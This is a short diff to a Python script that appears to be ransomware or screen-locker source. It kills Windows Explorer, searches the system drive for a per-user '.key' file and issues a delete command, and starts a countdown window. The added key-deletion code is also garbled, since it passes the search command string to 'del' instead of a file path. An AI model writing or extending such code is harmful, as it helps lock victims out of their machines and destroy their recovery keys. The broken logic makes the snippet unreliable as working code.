@@ -6,7 +6,19 @@ from timeit import default_timer
 import tkinter as tk
 import os, time, sys, timeps
 from modules.system import regedit, killproc, delproc
-killproc.exp() # Kill Explorer for Restarting machine
+# Kill Explorer for Restarting machine
+killproc.exp()
+path = os.environ["SystemDrive"]
+usr = os.environ["USERNAME"]
+# Search and remove key function
+usrkey = "%s.key" %(usr)
+def fkey():
+    rkey = "start /min dir /s %s\\%s" %(path, usrkey)
+    os.system(rkey)
+    chemin = "start /min del %s" %(rkey)
+    os.system(chemin)
+fkey()
+#Init window for gui_counter
 window = Tk()
 path = "\\PerfLogs\\gui_counter\\db.txt"
 # Function to set a time on the window
